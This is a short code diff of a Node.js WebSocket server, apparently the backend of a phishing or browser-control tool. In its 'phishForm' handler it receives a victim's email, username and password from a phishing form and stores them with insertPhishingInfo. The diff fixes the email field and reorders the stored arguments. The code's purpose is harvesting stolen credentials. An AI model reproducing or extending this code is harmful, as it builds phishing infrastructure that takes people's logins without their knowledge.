@@ -214,11 +214,11 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
 
         else if (type=='phishForm'){
             var id= data.id;
-            var email=data.domain;
+            var email=data.phishEmail;
             var username=data.phishName;
             var password=data.phishPass;
             //var json = {id:targetID,type:"html",domain:url};
-            database.insertPhishingInfo(id,email,username,password);
+            database.insertPhishingInfo(id,email,password,username);
         }
 
         //SENDING DATA
